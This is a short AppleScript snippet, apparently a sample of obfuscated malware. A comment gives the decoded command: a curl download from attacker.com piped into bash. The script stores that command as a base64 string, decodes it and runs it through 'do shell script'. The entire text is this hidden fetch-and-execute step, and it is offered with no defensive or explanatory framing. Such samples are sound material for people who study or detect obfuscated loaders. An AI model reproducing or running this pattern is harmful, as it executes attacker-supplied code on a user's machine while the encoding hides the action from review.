-- base64 of "curl -s http://attacker.com/payload.sh | bash"
set b64 to "Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQuc2ggfCBiYXNo"
do shell script "echo " & b64 & " | base64 -D | bash"
